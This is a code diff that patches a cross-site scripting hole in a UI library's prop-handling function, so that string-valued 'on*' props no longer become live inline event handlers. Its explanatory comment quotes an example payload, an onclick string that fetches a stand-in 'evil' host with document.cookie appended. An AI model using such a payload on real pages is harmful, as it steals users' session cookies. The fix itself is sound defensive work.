@@ -37,8 +37,21 @@ export function applyElementProps(
     for (const [key, value] of Object.entries(props)) {
         if (key.startsWith('--')) {
             el.style.setProperty(key, String(value));
-        } else if (key.startsWith('on') && typeof value === 'function') {
-            // Event handlers belong on the wrapper's event forwarding, not here.
+        } else if (key.startsWith('on')) {
+            // Event handlers belong on the wrapper's event forwarding, not here —
+            // and this drops them WHATEVER their type.
+            //
+            // The guard used to be `&& typeof value === 'function'`, which let a
+            // STRING through to `setAttribute` at the bottom of this chain:
+            // `{ onclick: 'fetch("//evil/?"+document.cookie)' }` became a live
+            // inline handler. Consumers spread arbitrary prop bags into
+            // `<AparteUi>` (React and Angular both), so those keys are not
+            // necessarily authored by the app.
+            //
+            // A function was already ignored; ignoring the string too costs a
+            // consumer nothing, because an `on*` string was never a working way to
+            // attach a listener here in the first place.
+            el.removeAttribute(key);
         } else if (value === null || value === undefined || value === false) {
             el.removeAttribute(key);
         } else if (value === true) {
